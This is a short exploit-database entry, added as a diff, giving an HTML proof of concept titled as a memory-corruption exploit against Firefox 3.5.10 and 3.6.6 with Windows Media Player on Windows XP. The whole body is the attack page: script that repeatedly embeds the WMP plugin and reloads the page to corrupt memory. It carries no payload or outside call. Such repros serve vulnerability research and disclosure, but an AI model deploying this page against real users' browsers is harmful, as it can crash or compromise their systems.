@@ -1,0 +1,27 @@
+Source: http://code.google.com/p/skylined/issues/detail?id=21
+
+# Exploit Title: Firefox 3.5.10 & 3.6.6 WMP Memory Corruption Using Popups
+# Date: 2010-10-13
+# Author: berendjanwever
+# Version: FF 3.5.10 & 3.6.6 with WMP 10 & 11
+# Tested on: Windows XP sp3
+
+<HTML>
+  <HEAD>
+    <SCRIPT>
+      function go() {
+        var oWMP = document.getElementById("WMP");
+        if (oWMP) {
+          location.reload();
+        } else {
+          var oWrapper = document.getElementById("wrapper");
+          oWrapper.innerHTML = '<EMBED id="WMP" type="application/x-mplayer2" autostart=1 src="repro-firefox.html"></EMBED>';
+          setTimeout(go, 1000);
+        }
+      }
+    </SCRIPT>
+  </HEAD>
+  <BODY onload="go()">
+    <SPAN id="wrapper"></SPAN>
+  </BODY>
+</HTML>
